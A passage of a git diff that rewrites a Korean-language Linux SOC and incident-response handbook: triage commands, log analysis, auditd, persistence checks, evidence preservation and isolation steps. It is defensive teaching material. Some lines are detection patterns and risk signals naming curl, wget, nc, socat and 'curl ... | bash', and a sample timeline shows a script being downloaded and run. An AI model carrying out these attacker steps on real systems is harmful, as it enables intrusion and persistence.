@@ -1,1587 +1,2158 @@
-# SOC Linux Server Investigation Cheat Sheet
+# Linux SOC / IR 실전 핸드북
 
-> 목적: Linux 서버에서 보안 이벤트가 발생했을 때 **탐지 → 확인 → 범위 확장 → 침해 판단 → 에스컬레이션**을 빠르게 수행하기 위한 SOC 분석용 실전 노트.
->
-> 기반: 사용자가 정리한 Linux 로그/인증/권한 상승/프로세스 분석 노트를 통합하고, 실제 조사에 필요한 조회 명령을 보강함.
->
-> **원칙:** 단일 로그나 단일 명령만으로 침해를 단정하지 않는다. `사용자 + 자산 + 시간 + 네트워크 + 변경 이력`을 함께 본다.
+> 분할본을 하나의 문서로 합친 버전입니다. 빠른 탐색은 분할본의 `00_README.md`를 권장합니다.
+
 
 ---
 
-## 0. 가장 먼저 기억할 것
+## 01. Linux 사고 초동 대응 · 증거 보존 · 격리
 
-### 관찰 가능한 행위
-- 로그인/로그아웃: SSH, console
-- 인증 실패/성공
-- 권한 상승: `sudo`, `su`, `pkexec`
-- 명령/프로세스 실행
-- 계정/그룹 변경
-- 파일 생성/수정/삭제
-- SSH 키 등록
-- cron/systemd 기반 지속성
-- 네트워크 연결 및 리스닝 포트
-- 서비스 시작/중지
+## 1. 사고 접수 직후 확인할 5가지
 
-### 로그의 한계
-- 모든 행위가 기본 설정에서 기록되는 것은 아니다.
-- root 권한 공격자는 로그/히스토리를 삭제하거나 변경할 수 있다.
-- `.bash_history`는 **보조 단서**이지 신뢰 가능한 감사 로그가 아니다.
-- `auditd`도 **관련 audit rule이 설정되어 있어야** 상세 `execve`/파일 접근을 볼 수 있다.
-- `wtmp`, `btmp`, `lastlog`도 root가 삭제/변조할 수 있으므로 "바이너리니까 안전"하다고 단정하지 않는다.
-- journald는 설정에 따라 `/run/log/journal`(휘발성) 또는 `/var/log/journal`(영속성)에 저장될 수 있다.
-- 컨테이너 로그는 호스트 `/var/log`가 아니라 stdout/stderr, runtime 또는 수집 플랫폼에만 존재할 수 있다.
-
-### 신뢰도 우선순위 예시
-
-| 데이터 소스 | 주요 용도 | 신뢰도/주의 |
-|---|---|---|
-| EDR/eBPF | 프로세스 트리, 커맨드라인, 네트워크 | 매우 높음. 에이전트 상태 확인 필요 |
-| auditd | syscall/execve/파일 접근 | 높음. **룰 설정 여부 확인 필수** |
-| auth.log / secure | SSH, sudo, su, PAM | 높음. root가 삭제 가능 |
-| journald | 서비스, 인증, 커널, 애플리케이션 | 높음. 보존 정책 확인 |
-| wtmp/btmp/lastlog | 로그인 세션/실패 | 중간~높음. 변조 가능 |
-| bash_history | 인터랙티브 셸 명령 | 낮음~중간. 쉽게 우회/삭제 가능 |
-
----
-
-# 1. 최초 5분 트리아지
-
-## 1.1 조사 기준 시간과 호스트 확인
-
-```bash
-hostnamectl
-hostname -f 2>/dev/null || hostname
-whoami
-id
-date -Is
-date -u -Is
-timedatectl
-uptime
-```
-
-확인 포인트:
-- 서버 이름/역할이 알림 대상과 맞는가?
-- 시스템 시간이 UTC/KST 중 무엇인가?
-- 최근 재부팅이 있었는가?
-- 로그 타임존과 SIEM 타임존이 동일한가?
-
-### 부팅 이력
-
-```bash
-journalctl --list-boots
-who -b
-uptime -s
-```
-
-> `journalctl -b -1` = **이전 부팅 세션**.  
-> `journalctl -b -l`은 이전 부팅이 아니라 현재 부팅 로그에서 긴 줄을 잘리지 않게 출력하는 옵션이다.
-
----
-
-## 1.2 현재 로그인 세션
-
+### 1) 현재 로그인 세션
 ```bash
 who
 w
-users
-```
-
-보다 상세히:
-
-```bash
-who -u
-w -h
-ps -ft pts/0
-```
-
-의심 포인트:
-- 평소 없는 관리자 계정
-- 비정상 시간대 로그인
-- Bastion/VPN을 거치지 않은 출발지
-- root 직접 로그인
-- 장시간 유지되는 알 수 없는 세션
-
----
-
-## 1.3 최근 로그인/실패 로그인
-
-```bash
-last -Fai | head -50
-sudo lastb -Fai | head -50
-lastlog | head -50
-```
-
-특정 계정:
-
-```bash
-last -Fai <USER>
-sudo lastb -Fai <USER>
-lastlog -u <USER>
-```
-
----
-
-## 1.4 현재 프로세스와 네트워크 빠른 확인
-
-```bash
-ps -eo user,pid,ppid,lstart,etime,cmd --forest
-ss -plant
-ss -lntup
-```
-
-의심 프로세스 빠른 검색:
-
-```bash
-ps auxww | grep -Ei 'curl|wget|nc |ncat|socat|python|perl|bash -c|sh -c|/tmp/|/dev/shm/' | grep -v grep
-```
-
-> `curl`, `wget`, `python`, `bash` 자체는 정상 도구다. **누가, 언제, 어떤 부모 프로세스에서, 어떤 인자로 실행했는지**가 핵심이다.
-
----
-
-# 2. Linux 로그 위치 빠르게 찾기
-
-## Debian/Ubuntu 계열
-
-| 목적 | 대표 위치 |
-|---|---|
-| 인증/SSH/sudo | `/var/log/auth.log` |
-| 일반 시스템 | `/var/log/syslog` |
-| 커널 | `/var/log/kern.log` 또는 `journalctl -k` |
-| 패키지 | `/var/log/dpkg.log`, `/var/log/apt/` |
-| 웹 | `/var/log/nginx/`, `/var/log/apache2/` |
-
-## RHEL/CentOS/Rocky/Alma 계열
-
-| 목적 | 대표 위치 |
-|---|---|
-| 인증/SSH/sudo | `/var/log/secure` |
-| 일반 시스템 | `/var/log/messages` |
-| 커널 | `journalctl -k`, `/var/log/messages` 등 |
-| 패키지 | `/var/log/dnf.log`, 구형 환경의 `/var/log/yum.log` |
-| 웹 | `/var/log/nginx/`, `/var/log/httpd/` |
-
-## 공통/주요 바이너리 로그
-
-```text
-/var/log/audit/audit.log   # auditd
-/var/log/wtmp              # 성공 로그인/로그아웃
-/var/log/btmp              # 실패 로그인
-/var/log/lastlog           # 계정별 마지막 로그인
-```
-
-현재 시스템에서 실제 존재하는 로그 확인:
-
-```bash
-sudo find /var/log -maxdepth 2 -type f -printf '%TY-%Tm-%Td %TH:%TM %10s %p\n' 2>/dev/null | sort -r | head -100
-```
-
----
-
-# 3. journalctl 실전 사용
-
-## 기본
-
-```bash
-journalctl -xe
-journalctl -b
-journalctl -b -1
-journalctl -k
-journalctl -p err -n 50
-```
-
-## 시간 범위 지정
-
-```bash
-journalctl --since '2026-08-08 01:50:00' --until '2026-08-08 02:30:00' --no-pager -o short-iso
-```
-
-실전에서는 조사 범위를 변수처럼 고정하면 편하다.
-
-```bash
-START='2026-08-08 01:50:00'
-END='2026-08-08 02:30:00'
-journalctl --since "$START" --until "$END" --no-pager -o short-iso
-```
-
-## SSH
-
-배포판에 따라 unit 이름이 `ssh` 또는 `sshd`일 수 있다.
-
-```bash
-journalctl -u ssh --since "$START" --until "$END" --no-pager
-journalctl -u sshd --since "$START" --until "$END" --no-pager
-```
-
-프로세스 이름 기반:
-
-```bash
-journalctl _COMM=sshd --since "$START" --until "$END" --no-pager
-journalctl _COMM=sudo --since "$START" --until "$END" --no-pager
-journalctl _COMM=su --since "$START" --until "$END" --no-pager
-```
-
-## cron / systemd
-
-```bash
-journalctl -u cron --since "$START" --until "$END" --no-pager
-journalctl -u crond --since "$START" --until "$END" --no-pager
-journalctl --since "$START" --until "$END" | grep -Ei 'CRON|CROND|systemd.*(Started|Stopped|Created|Reloaded)'
-```
-
-## journald 보존/무결성 상태
-
-```bash
-journalctl --disk-usage
-journalctl --list-boots
-sudo journalctl --verify
-```
-
----
-
-# 4. 텍스트 로그 조회 기본기
-
-## 실시간
-
-```bash
-sudo tail -F /var/log/auth.log
-sudo tail -F /var/log/secure
-```
-
-## 문맥 포함 검색
-
-```bash
-grep -n -C 3 'Failed password' /var/log/auth.log
-grep -n -B 5 -A 10 'Accepted password' /var/log/auth.log
-```
-
-## 여러 회전 로그 포함
-
-```bash
-sudo grep -H 'Failed password' /var/log/auth.log /var/log/auth.log.1 2>/dev/null
-sudo zgrep -H 'Failed password' /var/log/auth.log*.gz 2>/dev/null
-```
-
-RHEL:
-
-```bash
-sudo grep -H 'Failed password' /var/log/secure /var/log/secure-* 2>/dev/null
-sudo zgrep -H 'Failed password' /var/log/secure*.gz 2>/dev/null
-```
-
-## IP 빈도 집계
-
-필드 위치에 의존하는 `awk '{print $11}'`보다 `from <IP>` 패턴을 뽑는 방식이 안전하다.
-
-```bash
-grep 'Failed password' /var/log/auth.log \
-  | sed -nE 's/.* from ([^ ]+).*/\1/p' \
-  | sort | uniq -c | sort -rn | head -20
-```
-
-성공 로그인 IP:
-
-```bash
-grep -E 'Accepted (password|publickey)' /var/log/auth.log \
-  | sed -nE 's/.* from ([^ ]+).*/\1/p' \
-  | sort | uniq -c | sort -rn
-```
-
----
-
-# 5. SSH 인증 분석
-
-## 5.1 실패 이벤트
-
-```bash
-sudo grep -E 'Failed password|Invalid user|authentication failure' /var/log/auth.log
-# RHEL
-sudo grep -E 'Failed password|Invalid user|authentication failure' /var/log/secure
-```
-
-### 특정 IP
-
-```bash
-sudo grep '<IP>' /var/log/auth.log
-sudo journalctl _COMM=sshd --since "$START" --until "$END" | grep '<IP>'
-```
-
-### 특정 계정
-
-```bash
-sudo grep -E 'Failed password.*for (invalid user )?<USER>|Accepted .* for <USER>' /var/log/auth.log
-```
-
-### Brute force 패턴
-
-특징:
-- 단일/소수 계정에 짧은 간격으로 반복
-- 동일 IP 또는 소수 IP
-- 수십~수백 회 반복
-- 이후 성공이 이어지면 위험도 급상승
-
-```bash
-grep 'Failed password' /var/log/auth.log \
-  | sed -nE 's/.* for (invalid user )?([^ ]+) from ([^ ]+).*/\2 \3/p' \
-  | sort | uniq -c | sort -rn | head -30
-```
-
-### Password spraying 패턴
-
-특징:
-- 하나의 IP가 다수 계정을 순차적으로 시도
-- 계정당 실패 횟수는 많지 않을 수 있음
-
-```bash
-grep -E 'Failed password|Invalid user' /var/log/auth.log \
-  | sed -nE 's/.* from ([^ ]+).*/\1/p' \
-  | sort | uniq -c | sort -rn | head -20
-```
-
-IP 하나를 잡은 뒤 대상 계정 확인:
-
-```bash
-grep '<IP>' /var/log/auth.log | grep -E 'Failed password|Invalid user'
-```
-
-### 운영 오류 가능성이 높은 패턴
-- 내부 관리 IP
-- 동일 서비스 계정
-- 정확히 5분/10분/1시간 주기
-- 패스워드 변경 직후 시작
-- 배치/백업 서버와 연결됨
-
-판단 전에 확인:
-- 계정 소유자
-- CM/작업 승인
-- 비밀번호 변경 시점
-- 해당 IP 자산의 역할
-
----
-
-## 5.2 성공 로그인
-
-```bash
-sudo grep -E 'Accepted password|Accepted publickey' /var/log/auth.log
-# RHEL
-sudo grep -E 'Accepted password|Accepted publickey' /var/log/secure
-```
-
-### 확인해야 할 4가지
-1. 정상 계정인가?
-2. 정상 출발지인가? — Bastion/VPN/관리망/신규 IP
-3. 직전 실패가 있었는가?
-4. 로그인 직후 `sudo`, 파일 전송, 다운로드, 지속성 생성이 있었는가?
-
-### 실패 → 성공 연결
-
-```bash
-grep '<IP>' /var/log/auth.log | grep -E 'Failed password|Invalid user|Accepted'
-```
-
-계정 기준:
-
-```bash
-grep '<USER>' /var/log/auth.log | grep -E 'Failed password|Accepted|session opened|session closed'
-```
-
-### 세션 지속 시간 확인
-
-```bash
-last -Fai <USER>
-```
-
-현재도 접속 중인지:
-
-```bash
-who
-w
-```
-
----
-
-## 5.3 root 직접 로그인
-
-```bash
-grep -E 'Accepted .* for root|Failed password for root' /var/log/auth.log
-```
-
-위험도 높은 조합:
-
-```text
-신규 IP + 야간 + root 로그인 + sudo/bash 또는 파일 다운로드
-반복 실패 → root 성공
-Bastion/VPN 미경유
-root 공개키 로그인 + authorized_keys 최근 변경
-```
-
-정상 가능 조합:
-
-```text
-예외 승인 + 정해진 Bastion + maintenance window + 승인된 작업 명령
-```
-
----
-
-# 6. SSH 공개키 및 authorized_keys 분석
-
-로그만으로는 기존 정상 키인지 공격자가 새로 심은 키인지 구분하기 어렵다.
-
-## authorized_keys 위치 확인
-
-```bash
-sudo find /root /home -type f -path '*/.ssh/authorized_keys' -print 2>/dev/null
-```
-
-권한/수정 시각:
-
-```bash
-sudo stat /root/.ssh/authorized_keys 2>/dev/null
-sudo find /home -type f -path '*/.ssh/authorized_keys' -exec stat -c '%y %U:%G %a %n' {} \; 2>/dev/null
-```
-
-내용 검토:
-
-```bash
-sudo cat /root/.ssh/authorized_keys 2>/dev/null
-sudo grep -RHE '^(ssh-|ecdsa-|sk-)' /home/*/.ssh/authorized_keys 2>/dev/null
-```
-
-키 fingerprint 확인:
-
-```bash
-sudo ssh-keygen -lf /root/.ssh/authorized_keys 2>/dev/null
-sudo ssh-keygen -lf /home/<USER>/.ssh/authorized_keys 2>/dev/null
-```
-
-분석 포인트:
-- 파일 mtime이 사고 시간과 겹치는가?
-- 새로운 키가 추가되었는가?
-- root 계정에 원래 키가 존재했는가?
-- 로그인 직전 `authorized_keys` 변경 흔적이 있는가?
-- FIM/auditd에 쓰기 이벤트가 있는가?
-
-### auditd에서 키 파일 변경 검색 — 룰이 사전에 존재한 경우
-
-```bash
-sudo ausearch -f /root/.ssh/authorized_keys -i
-sudo ausearch -f /home/<USER>/.ssh/authorized_keys -i
-```
-
----
-
-# 7. sudo / su / pkexec 권한 상승
-
-## 7.1 sudo 로그
-
-```bash
-sudo grep 'sudo:' /var/log/auth.log
-sudo journalctl _COMM=sudo --since "$START" --until "$END" --no-pager
-```
-
-특정 사용자:
-
-```bash
-grep 'sudo:.*<USER>' /var/log/auth.log
-```
-
-위험 신호 예시:
-
-```text
-COMMAND=/bin/bash
-COMMAND=/bin/sh
-COMMAND=/usr/sbin/useradd ...
-COMMAND=/usr/sbin/usermod ...
-COMMAND=/bin/chmod ... /etc/sudoers
-COMMAND=/usr/bin/curl ...
-COMMAND=/usr/bin/wget ...
-COMMAND=/usr/bin/systemctl enable ...
-COMMAND=/usr/bin/crontab ...
-```
-
-> `TTY=pts/0`은 pseudo-terminal 세션을 의미한다. SSH에서 흔하지만 **그 자체만으로 SSH임을 단정하지 않는다.** 로그인 세션과 함께 상관분석한다.
-
-### 사용자의 sudo 권한 확인
-
-```bash
-sudo -l -U <USER>
-```
-
-관리 그룹 확인:
-
-```bash
-getent group sudo
-getent group wheel
-```
-
----
-
-## 7.2 sudoers 변경
-
-```bash
-sudo stat /etc/sudoers
-sudo find /etc/sudoers.d -maxdepth 1 -type f -exec stat -c '%y %U:%G %a %n' {} \;
-sudo grep -RHE 'NOPASSWD|ALL=\(ALL' /etc/sudoers /etc/sudoers.d 2>/dev/null
-```
-
-최근 변경 파일:
-
-```bash
-sudo find /etc/sudoers.d -type f -mmin -1440 -ls 2>/dev/null
-```
-
-auditd:
-
-```bash
-sudo ausearch -f /etc/sudoers -i
-sudo ausearch -f /etc/sudoers.d -i
+last -a | head -30
+lastb -a | head -30
 ```
 
 확인 포인트:
-- 신규 `.conf`/override 파일
-- `NOPASSWD:ALL`
-- 특정 서비스 계정에 과도한 권한
-- 사고 직전/직후 mtime
-- 변경 후 즉시 sudo 성공
+- 의심 계정이 아직 접속 중인가
+- 출발지 IP가 Bastion/VPN/관리망인지, 신규·외부 IP인지
+- 실패 후 성공으로 이어졌는가
+- 세션 지속 시간이 비정상적으로 긴가
 
----
-
-## 7.3 su
-
+### 2) 현재 네트워크 연결
 ```bash
-sudo grep -E 'su:|session opened for user root' /var/log/auth.log
-sudo journalctl _COMM=su --since "$START" --until "$END"
+ss -tnp
+ss -tnp | grep ESTAB
+ss -tlnp
+netstat -tnp 2>/dev/null | grep ESTABLISHED
 ```
 
-확인 포인트:
-- 어떤 원래 사용자가 root로 전환했는가?
-- 정상 관리 패턴인가?
-- 전환 직후 실행된 명령은 무엇인가?
-
----
-
-## 7.4 pkexec
-
+특정 IOC 확인:
 ```bash
-sudo journalctl _COMM=pkexec --since "$START" --until "$END"
-sudo grep -Ei 'pkexec|polkit' /var/log/auth.log /var/log/syslog 2>/dev/null
+ss -tnp | grep '203.0.113.5'
 ```
 
-취약점 악용 시 표준 인증 로그가 충분하지 않을 수 있으므로 auditd/EDR/프로세스 텔레메트리와 결합한다.
-
----
-
-# 8. 계정 생성/변경/관리자 그룹 추가
-
-## 인증/시스템 로그
-
+### 3) 현재 프로세스
 ```bash
-sudo grep -Ei 'useradd|adduser|usermod|userdel|passwd|groupadd|groupmod' /var/log/auth.log /var/log/syslog 2>/dev/null
-sudo journalctl --since "$START" --until "$END" | grep -Ei 'useradd|adduser|usermod|userdel|passwd|groupadd|groupmod'
+ps auxf
+ps -eo user,pid,ppid,lstart,comm,args --sort=lstart
 ```
 
-RHEL:
+우선 확인:
+- `/tmp`, `/var/tmp`, `/dev/shm`에서 실행
+- `nginx/httpd → sh/bash → curl/wget`
+- 숨김 파일 실행
+- `nohup`, `base64 -d`, `bash -c`, `python -c`
+- 삭제된 실행 파일을 계속 실행 중인 프로세스
 
+### 4) 최근 인증·감사 이벤트
+Ubuntu/Debian:
 ```bash
-sudo grep -Ei 'useradd|usermod|userdel|passwd|groupadd|groupmod' /var/log/secure /var/log/messages 2>/dev/null
-```
-
-## 현재 계정 목록
-
-```bash
-getent passwd
-```
-
-UID 0 계정:
-
-```bash
-awk -F: '$3 == 0 {print $1,$3,$6,$7}' /etc/passwd
-```
-
-로그인 가능한 셸을 가진 계정:
-
-```bash
-awk -F: '$7 !~ /(nologin|false)$/ {print $1,$3,$6,$7}' /etc/passwd
-```
-
-일반 사용자 범위의 계정 확인:
-
-```bash
-awk -F: '$3 >= 1000 && $1 != "nobody" {print $1,$3,$6,$7}' /etc/passwd
-```
-
-관리 그룹:
-
-```bash
-getent group sudo
-getent group wheel
-```
-
-계정 파일 변경 시간:
-
-```bash
-stat /etc/passwd /etc/shadow /etc/group /etc/gshadow
-```
-
-분석 포인트:
-- 생성 시각이 사고 시간대와 겹치는가?
-- 이름이 정상 서비스 계정처럼 위장되어 있는가?
-- 생성 직후 `passwd` → sudo/wheel 추가 → 로그인으로 이어지는가?
-- 기존 기준선에 없던 계정인가?
-
-> `backup`, `sync`, `monitor`, `nagios` 같은 이름 자체는 IOC가 아니다. **기존 자산 기준선과 승인 이력**이 중요하다.
-
----
-
-# 9. cron 지속성
-
-## 시스템 cron
-
-```bash
-sudo ls -lah /etc/cron* /var/spool/cron 2>/dev/null
-sudo find /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.weekly /etc/cron.monthly \
-  -maxdepth 2 -type f -exec stat -c '%y %U:%G %a %n' {} \; 2>/dev/null | sort
-```
-
-## 사용자 crontab
-
-현재 사용자:
-
-```bash
-crontab -l
-```
-
-특정 사용자:
-
-```bash
-sudo crontab -l -u <USER>
-```
-
-가능한 전체 사용자 검사:
-
-```bash
-while IFS=: read -r u _; do
-  sudo crontab -l -u "$u" 2>/dev/null && echo "--- $u ---"
-done < /etc/passwd
-```
-
-## 로그
-
-```bash
-sudo grep -Ei 'CRON|CROND' /var/log/syslog /var/log/cron 2>/dev/null
-sudo journalctl --since "$START" --until "$END" | grep -Ei 'CRON|CROND'
-```
-
-위험 신호:
-- `curl ... | bash`
-- `wget ... && chmod +x ...`
-- `/tmp`, `/var/tmp`, `/dev/shm` 실행
-- 숨김 파일 `.update`, `.cache`, `.sys`
-- `>/dev/null 2>&1`로 출력 은닉
-- root crontab 신규 등록
-
-> 출력 리다이렉션 자체는 정상 운영에서도 흔하다. 경로/명령/소유자/등록 시각을 함께 본다.
-
----
-
-# 10. systemd 서비스/타이머 지속성
-
-## 실행 중 서비스
-
-```bash
-systemctl --type=service --state=running
-```
-
-## enabled 서비스
-
-```bash
-systemctl list-unit-files --type=service --state=enabled
-```
-
-## 타이머
-
-```bash
-systemctl list-timers --all
-systemctl list-unit-files --type=timer
-```
-
-## 최근 unit 파일
-
-```bash
-sudo find /etc/systemd/system /usr/lib/systemd/system /lib/systemd/system \
-  -type f -mmin -1440 -exec stat -c '%y %U:%G %a %n' {} \; 2>/dev/null | sort
-```
-
-특정 서비스 조사:
-
-```bash
-systemctl status <SERVICE> --no-pager
-systemctl cat <SERVICE>
-journalctl -u <SERVICE> --since "$START" --until "$END" --no-pager
-```
-
-위험 신호:
-- `ExecStart=/tmp/...`
-- `ExecStart=/dev/shm/...`
-- 숨김 파일/임시 경로
-- 정상 업데이트/모니터링 서비스처럼 위장한 이름
-- 사고 시간대에 신규 unit 생성 + `enable` + `start`
-
----
-
-# 11. 추가 지속성 위치 빠른 점검
-
-기존 노트의 cron/systemd/SSH 키 외에 실제 Linux 조사에서 자주 보는 위치다.
-
-```bash
-sudo ls -la /etc/profile /etc/profile.d 2>/dev/null
-sudo find /home /root -maxdepth 2 \( -name '.bashrc' -o -name '.bash_profile' -o -name '.profile' \) -ls 2>/dev/null
-sudo cat /etc/rc.local 2>/dev/null
-sudo cat /etc/ld.so.preload 2>/dev/null
-sudo find /root /home -path '*/.config/systemd/user/*' -type f -ls 2>/dev/null
-```
-
-특히 `/etc/ld.so.preload`에 예상하지 못한 shared library가 있으면 우선순위를 높인다.
-
----
-
-# 12. 프로세스 분석
-
-## 전체 프로세스 + 부모/자식
-
-```bash
-ps -eo user,pid,ppid,lstart,etime,%cpu,%mem,cmd --forest
-```
-
-대안:
-
-```bash
-pstree -aps
-```
-
-특정 PID:
-
-```bash
-PID=<PID>
-ps -fp "$PID"
-ps -o user,pid,ppid,lstart,etime,cmd -p "$PID"
-cat /proc/$PID/status
-tr '\0' ' ' < /proc/$PID/cmdline; echo
-readlink -f /proc/$PID/exe
-readlink -f /proc/$PID/cwd
-```
-
-부모 확인:
-
-```bash
-PPID=$(ps -o ppid= -p "$PID" | tr -d ' ')
-ps -fp "$PPID"
-```
-
-### 의심해야 하는 조합
-
-```text
-sshd → bash → curl/wget → chmod → /tmp/<binary>
-nginx/apache → sh/bash/python
-cron/systemd → /tmp 또는 /dev/shm 실행파일
-서비스 계정(www-data, nginx 등) → sudo/root shell
-python/perl/bash → 외부 IP 장기 연결
-```
-
-## 삭제되었지만 실행 중인 바이너리
-
-```bash
-sudo ls -l /proc/*/exe 2>/dev/null | grep '(deleted)'
-sudo lsof +L1 2>/dev/null
-```
-
-이는 공격자가 실행 후 파일을 삭제한 경우 유용한 흔적이 될 수 있다. 정상 업데이트/교체 과정에서도 발생할 수 있으므로 프로세스와 패키지 상태를 확인한다.
-
----
-
-# 13. 명령 실행 흔적
-
-## bash history
-
-```bash
-history
-cat ~/.bash_history
-sudo cat /root/.bash_history 2>/dev/null
-```
-
-전체 사용자 history 탐색:
-
-```bash
-sudo find /root /home -maxdepth 2 -name '.*history' -type f -print 2>/dev/null
-```
-
-키워드:
-
-```bash
-sudo grep -RHiE 'curl|wget|nc |ncat|socat|chmod \+x|useradd|usermod|crontab|systemctl|authorized_keys|base64|python -c|python3 -c' \
-  /root/.*history /home/*/.*history 2>/dev/null
-```
-
-### history 한계
-- 비대화형 셸은 기록되지 않을 수 있음
-- 세션 종료 전에는 파일에 아직 flush되지 않을 수 있음
-- `HISTFILE` 비활성화 가능
-- `history -c`/파일 삭제 가능
-- 스크립트 내부 실행은 개별 명령으로 남지 않을 수 있음
-
-따라서 다음과 결합:
-- sudo 로그
-- auditd
-- EDR/eBPF
-- 프로세스/네트워크 텔레메트리
-- 서비스 로그
-
----
-
-# 14. auditd 실전 분석
-
-## auditd가 동작 중인가?
-
-```bash
-systemctl status auditd --no-pager
-sudo auditctl -s
-sudo auditctl -l
-```
-
-> `auditctl -l`로 어떤 규칙이 실제 설정되어 있는지 먼저 본다. 기본 설정만으로 모든 `execve`가 기록되는 것은 아니다.
-
-## 시간 범위
-
-```bash
-sudo ausearch -ts '08/08/2026 01:50:00' -te '08/08/2026 02:30:00' -i
-```
-
-환경/버전에 따라 `-ts`, `-te` 날짜 형식 지원이 다를 수 있으므로 `man ausearch`로 확인한다.
-
-## 특정 사용자/UID
-
-```bash
-id <USER>
-sudo ausearch -ua <UID> -i
-```
-
-## 실행 파일
-
-```bash
-sudo ausearch -x /usr/bin/sudo -i
-sudo ausearch -x /usr/bin/curl -i
-sudo ausearch -x /usr/bin/wget -i
-```
-
-## 특정 파일
-
-```bash
-sudo ausearch -f /etc/sudoers -i
-sudo ausearch -f /etc/passwd -i
-sudo ausearch -f /root/.ssh/authorized_keys -i
-```
-
-## 인증 보고서
-
-```bash
-sudo aureport -au
-sudo aureport -au --summary
-sudo aureport -x --summary
-```
-
-### audit 필드 핵심
-
-```text
-uid   = 원래 로그인 사용자
-auid  = audit login UID. sudo 이후에도 원래 사용자 추적에 유용
-euid  = 실행 시 유효 권한
-exe   = 실행 파일
-comm  = 프로세스명
-proctitle / EXECVE = 명령행/인자
-```
-
-특히 root로 실행된 프로세스에서도 `auid`가 일반 사용자이면 **누가 root 권한을 사용했는지** 연결하는 데 유용하다.
-
----
-
-# 15. 파일 분석
-
-## 최근 변경 파일
-
-최근 60분:
-
-```bash
-sudo find /etc /home /root /tmp /var/tmp /dev/shm -xdev -type f -mmin -60 -ls 2>/dev/null
-```
-
-최근 24시간:
-
-```bash
-sudo find /etc /home /root /tmp /var/tmp /dev/shm -xdev -type f -mtime -1 -ls 2>/dev/null
-```
-
-> `-mtime -1`은 "오늘"이 아니라 현재 시각 기준 약 24시간 범위라는 점에 주의.
-
-## 임시 디렉터리 실행 파일
-
-```bash
-sudo find /tmp /var/tmp /dev/shm -xdev -type f -perm /111 -ls 2>/dev/null
-```
-
-## 숨김 파일
-
-```bash
-sudo find /tmp /var/tmp /dev/shm -xdev -type f -name '.*' -ls 2>/dev/null
-```
-
-## 특정 파일 메타데이터
-
-```bash
-stat <FILE>
-file <FILE>
-sha256sum <FILE>
-ls -l --full-time <FILE>
-```
-
-ELF라면:
-
-```bash
-readelf -h <FILE> 2>/dev/null
-strings -a <FILE> | head -100
-```
-
-> 의심 파일을 실행해서 확인하지 않는다. 해시/메타데이터/정적 문자열부터 확인한다.
-
-## 패키지 소유 파일인지 확인
-
-Debian/Ubuntu:
-
-```bash
-dpkg -S <FILE>
+tail -n 200 /var/log/auth.log
 ```
 
 RHEL 계열:
-
 ```bash
-rpm -qf <FILE>
+tail -n 200 /var/log/secure
 ```
 
-RHEL 패키지 무결성:
+auditd:
+```bash
+tail -n 200 /var/log/audit/audit.log
+ausearch --start recent
+```
+
+journald:
+```bash
+journalctl -xe
+journalctl -u sshd --since '-1 hour'
+```
+
+### 5) 시간 기준 확정
+```bash
+timedatectl status
+date
+date -u
+```
+
+> 분석 시작 전에 서버 로컬 시간, SIEM 시간, UTC/KST 등의 차이를 반드시 확정한다.
+
+---
+
+## 2. 증거 보존 우선순위
+
+네트워크 격리나 재부팅 전에 사라질 수 있는 정보부터 확보한다.
+
+### 휘발성 정보
+```bash
+who > who.txt
+w > w.txt
+ps auxfww > ps_auxfww.txt
+ss -tanp > ss_tanp.txt
+ss -tulnp > ss_tulnp.txt
+ip addr > ip_addr.txt
+ip route > ip_route.txt
+```
+
+### 핵심 설정·지속성 파일
+```bash
+cp -a /etc/passwd ./evidence/
+cp -a /etc/group ./evidence/
+cp -a /etc/sudoers ./evidence/
+cp -a /etc/sudoers.d ./evidence/ 2>/dev/null
+cp -a /etc/cron.d ./evidence/ 2>/dev/null
+cp -a /etc/systemd/system ./evidence/ 2>/dev/null
+```
+
+SSH 키:
+```bash
+find /root /home -name authorized_keys -type f -print 2>/dev/null
+```
+
+### 로그 스냅샷
+```bash
+cp -a /var/log/auth.log* ./evidence/ 2>/dev/null
+cp -a /var/log/secure* ./evidence/ 2>/dev/null
+cp -a /var/log/audit ./evidence/ 2>/dev/null
+journalctl --since '2026-08-11 00:00:00' > journal_snapshot.txt
+```
+
+### 의심 파일 보존
+```bash
+stat /tmp/.suspect
+sha256sum /tmp/.suspect
+cp --preserve=all /tmp/.suspect ./evidence/
+```
+
+원본을 직접 실행하거나 수정하지 않는다.
+
+---
+
+## 3. 격리 수준
+
+### 경량 격리
+- 특정 IOC IP 차단
+- 의심 계정 잠금
+- 특정 접근 경로 차단
+
+### 중간 격리
+- 관리망/포렌식망 등 필요한 내부 통신만 허용
+
+### 완전 격리
+- 네트워크를 전면 차단
+- 진행 중인 피해가 크거나 C2/유출이 명확할 때 고려
+
+### 특정 IP 차단 예시
+> 운영 상태를 변경하는 명령이다.
 
 ```bash
-rpm -V <PACKAGE>
+iptables -I INPUT  -s 203.0.113.5 -j DROP
+iptables -I OUTPUT -d 203.0.113.5 -j DROP
+```
+
+### 의심 계정 잠금
+```bash
+usermod -L backupsvc
+passwd -l backupsvc
+```
+
+### SSH 사용자 차단
+`/etc/ssh/sshd_config`에 정책 반영:
+```text
+DenyUsers admin backupsvc
+```
+
+설정 검증 후 재로드:
+```bash
+sshd -t && systemctl reload sshd
 ```
 
 ---
 
-# 16. 네트워크 분석
+## 4. 침해 타임라인 기본 골격
 
-## 현재 TCP 연결
-
-```bash
-ss -plant
+```text
+[초기 접근] SSH 성공 / 웹 취약점 / 관리 채널
+                ↓
+[권한 상승] sudo / su / 취약한 특권 명령
+                ↓
+[실행] curl/wget → chmod → bash/nohup
+                ↓
+[지속성] cron / systemd / authorized_keys / 신규 계정
+                ↓
+[행위] 내부 탐색 / lateral movement / C2 / 데이터 유출
+                ↓
+[은닉] history/log 삭제 / hidden file / LD_PRELOAD
 ```
 
-## 리스닝 포트
-
-```bash
-ss -lntup
+예시:
+```text
+02:06 auth     Accepted password for admin from 198.51.100.23
+02:08 sudo     admin → root /bin/bash
+02:09 auditd   curl ... -o /tmp/a.sh
+02:10 auditd   chmod +x /tmp/a.sh ; nohup /tmp/a.sh
+02:17 cron     root CMD (/tmp/a.sh ...)
+02:20 network  dst=203.0.113.10:443 반복 연결
 ```
 
-## UDP
+---
+
+## 5. 사고 보고서 최소 구성
+
+1. **요약**: 무엇이, 언제, 어디서, 어떻게, 어느 범위까지 발생했는가
+2. **타임라인**: 최초 이벤트부터 탐지·조치까지
+3. **기술 분석**: 계정/IP/프로세스/파일/네트워크 및 MITRE ATT&CK 매핑
